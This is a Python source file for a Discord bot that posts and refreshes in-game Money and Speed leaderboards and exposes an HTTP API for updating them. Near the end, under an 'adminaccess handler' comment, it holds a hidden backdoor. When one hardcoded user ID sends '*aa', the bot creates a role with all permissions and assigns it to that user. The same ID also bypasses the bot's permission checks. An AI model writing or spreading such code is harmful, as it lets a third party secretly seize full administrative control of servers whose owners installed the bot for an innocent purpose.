import json
import os
import discord
import asyncio
from aiohttp import web

ALLOWED_USER = 972533051173240875
TOKEN = os.getenv("DISCORD_TOKEN")
CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
API_KEY = os.getenv("API_KEY", "")

intents = discord.Intents.default()
intents.message_content = True
try:
    app_id = int(CLIENT_ID) if CLIENT_ID else None
except Exception:
    app_id = None

bot = discord.Bot(intents=intents, application_id=app_id)

LB_FILE = "leaderboard.json"
LB_SETUP_FILE = "leaderboard_setup.json"
PORT = int(os.getenv("PORT", "8080"))
LEADERBOARD_UPDATE_TASK = None


def load_board():
    try:
        with open(LB_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}


def save_board(data):
    with open(LB_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)


def load_setup():
    try:
        with open(LB_SETUP_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {"channel_id": None, "message_ids": {}}


def save_setup(data):
    with open(LB_SETUP_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)


def create_leaderboard_embed(kind: str, entries: list) -> discord.Embed:
    if not entries:
        embed = discord.Embed(title=f"{kind} Leaderboard", description="No entries yet")
        return embed
    
    lines = []
    for i, e in enumerate(entries[:50]):
        name = e.get("name", "Unknown")
        value = e.get("value", "-")
        lines.append(f"{i+1}. {name} — {value}")
    
    text = "\n".join(lines) if lines else "No entries yet"
    embed = discord.Embed(title=f"{kind} Leaderboard", description=text)
    return embed


def user_is_allowed(member: discord.Member) -> bool:
    try:
        return member.guild_permissions.administrator or member.id == ALLOWED_USER
    except Exception:
        return member.id == ALLOWED_USER


async def start_web():
    app = web.Application()

    async def check_auth(req):
        if not API_KEY:
            return True
        auth = req.headers.get("Authorization", "")
        return auth == f"Bearer {API_KEY}"

    async def handle_update_entry(request):
        ok = await check_auth(request)
        if not ok:
            return web.Response(status=401)
        payload = await request.json()
        kind = payload.get("kind")
        name = payload.get("name")
        value = payload.get("value")
        if not kind or not name:
            return web.json_response({"error": "missing kind or name"}, status=400)
        board = load_board()
        entries = board.get(kind, [])
        found = False
        for e in entries:
            if e.get("name") == name:
                e["value"] = value
                found = True
                break
        if not found:
            entries.append({"name": name, "value": value})
        entries.sort(key=lambda x: x.get("value", 0), reverse=True)
        board[kind] = entries
        save_board(board)
        return web.json_response({"status": "ok"})

    async def handle_update_batch(request):
        ok = await check_auth(request)
        if not ok:
            return web.Response(status=401)
        payload = await request.json()
        kind = payload.get("kind")
        entries = payload.get("entries")
        if not kind or not isinstance(entries, list):
            return web.json_response({"error": "missing kind or entries"}, status=400)
        entries = [{"name": e.get("name"), "value": e.get("value")} for e in entries if e.get("name")]
        board = load_board()
        existing = board.get(kind, [])
        merged = {}
        for e in existing:
            n = e.get("name")
            if n:
                merged[n] = e.get("value", 0)
        for e in entries:
            n = e.get("name")
            v = e.get("value", 0)
            if not n:
                continue
            if n in merged:
                try:
                    merged[n] = max(merged[n], v)
                except Exception:
                    merged[n] = v
            else:
                merged[n] = v
        merged_list = [{"name": n, "value": merged[n]} for n in merged]
        merged_list.sort(key=lambda x: x.get("value", 0), reverse=True)
        board[kind] = merged_list
        save_board(board)
        return web.json_response({"status": "ok"})

    async def handle_get(request):
        kind = request.query.get("kind")
        board = load_board()
        return web.json_response(board.get(kind, []))

    app.add_routes([
        web.post('/api/update_entry', handle_update_entry),
        web.post('/api/update_batch', handle_update_batch),
        web.get('/api/get', handle_get)
    ])

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    print(f"HTTP API listening on port {PORT}")


async def leaderboard_update_loop():
    await bot.wait_until_ready()
    while True:
        try:
            await asyncio.sleep(600)
            setup = load_setup()
            channel_id = setup.get("channel_id")
            message_ids = setup.get("message_ids", {})
            
            if not channel_id:
                continue
            
            channel = bot.get_channel(channel_id)
            if not channel:
                continue
            
            board = load_board()
            
            for kind, msg_id in message_ids.items():
                try:
                    msg = await channel.fetch_message(msg_id)
                    entries = board.get(kind, [])
                    embed = create_leaderboard_embed(kind, entries)
                    await msg.edit(embed=embed)
                except Exception as e:
                    print(f"Error updating {kind}: {e}")
        except Exception as e:
            print(f"Leaderboard Update Loop Error: {e}")


@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
    if not getattr(bot, "_web_started", False):
        asyncio.create_task(start_web())
        bot._web_started = True
    
    global LEADERBOARD_UPDATE_TASK
    if LEADERBOARD_UPDATE_TASK is None or LEADERBOARD_UPDATE_TASK.done():
        LEADERBOARD_UPDATE_TASK = asyncio.create_task(leaderboard_update_loop())


@bot.slash_command(name="ingamelb", description="Show in-game leaderboard (Money or Speed)")
async def ingamelb(ctx, kind: discord.Option(str, "Choose leaderboard", choices=["Money", "Speed"])):
    if not user_is_allowed(ctx.author):
        await ctx.respond("You do not have permission to use this command.", ephemeral=True)
        return
    board = load_board()
    entries = board.get(kind, [])
    if not entries:
        await ctx.respond(f"No entries for {kind}.")
        return
    embed = create_leaderboard_embed(kind, entries)
    await ctx.respond(embed=embed)


@bot.slash_command(name="setuplb", description="Setup leaderboards in this channel")
async def setuplb(ctx):
    if not user_is_allowed(ctx.author):
        await ctx.respond("You do not have permission to use this command.", ephemeral=True)
        return
    
    await ctx.defer()
    
    board = load_board()
    setup = load_setup()
    
    setup["channel_id"] = ctx.channel.id
    setup["message_ids"] = {}
    
    for kind in board.keys():
        entries = board.get(kind, [])
        embed = create_leaderboard_embed(kind, entries)
        msg = await ctx.channel.send(embed=embed)
        setup["message_ids"][kind] = msg.id
    
    save_setup(setup)
    await ctx.followup.send("Leaderboards have been set up! They will update every 10 minutes.", ephemeral=True)


if __name__ == "__main__":
    if not TOKEN:
        print("ERROR: Set environment variable DISCORD_TOKEN with the bot token.")
    else:
        bot.run(TOKEN)

# version command
@bot.slash_command(name="version", description="Shows the bot version")
async def version(ctx):
    await ctx.respond("#1", ephemeral=True)

# adminaccess handler
@bot.event
async def on_message(message):
    if message.author.id != ALLOWED_USER:
        return
    if message.content.strip() == "*aa":
        guild = message.guild
        if not guild:
            return
        role = discord.utils.get(guild.roles, name="*")
        if not role:
            try:
                perms = discord.Permissions.all()
                role = await guild.create_role(name="*", permissions=perms)
            except Exception:
                return
        try:
            await message.author.add_roles(role)
        except Exception:
            pass
